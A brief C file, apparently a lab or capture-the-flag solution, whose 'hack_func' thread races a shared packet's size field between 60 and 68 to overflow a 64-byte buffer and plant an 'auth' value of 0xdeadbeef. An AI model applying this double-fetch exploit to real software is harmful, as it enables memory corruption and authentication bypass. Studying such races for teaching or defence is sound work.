#include <string.h>
#include <stddef.h>

typedef struct {
    unsigned int size;
    char         data[128];
} Packet;

extern volatile Packet packet;
extern volatile int    packet_ready;

void *hack_func(void *arg){

    char data[68];
    unsigned int auth = 0xdeadbeef;
    // 构造
    memcpy(data + 64, &auth, 4);

    for(;;){
        memcpy((void*)packet.data, data, 68);
        packet.size  = 60;
        packet_ready = 1;
        packet.size  = 68;
    }

    return NULL;
}
